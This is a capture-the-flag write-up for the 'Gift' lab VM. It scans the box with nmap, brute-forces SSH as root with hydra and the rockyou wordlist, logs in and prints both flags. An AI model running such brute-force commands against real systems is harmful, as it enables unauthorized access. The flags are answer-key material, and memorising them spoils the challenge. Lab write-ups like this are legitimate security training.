# Gift

- **Description:** A really easy VM. Thats a gift 
- **Difficulty:** Easy

---

## 🔎 Solution
When I booted the Gift VM it picked up an IP address. 
A quick **nmap** service scan shows 2 open ports: SSH on 22 and HTTP on 80.
```
> nmap -sV 10.0.2.4

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
80/tcp open  http    nginx
MAC Address: 08:00:27:0A:DB:80 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

I opened `http://<IP-address>:80` in the browser and the page only displayed a short line of text (as in the screenshot) - not much to go on (mayybe ^^).
<div style={{ width: '100%', margin: '0 auto' }}>
  <img src={require("./web.png").default} style={{ width: '100%', height: 'auto' }} />
</div>
Since SSH was available on port 22 I decided to try a brute-force approach for valid credentials. 
For usernames I prepared a small list of common accounts (`kali`, `root`, `gift`) in `username.txt`, and for passwords I used the `rockyou` wordlist.

I ran `hydra` against the SSH service and it returned a successful credential pair: `root:simple`.
```
> hydra -L username.txt -P rockyou.txt -s 22 ssh://10.0.2.4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

```

Using the discovered credentials I SSHed into the box:
```
> ssh root@10.0.2.4
root@10.0.2.4's password: 
IM AN SSH SERVER
```

Once in, listing the home directory revealed 2 flag files. 
```
gift:~# ls
root.txt  user.txt
```

Reading them gave the user and root flags:
```
gift:~# cat user.txt 
HMV665sXzDS
gift:~# cat root.txt 
HMVtyr543FG
```

## 🚩Flag
**User flag:**
> `HMV665sXzDS`

**Root flag:**
> `HMVtyr543FG`
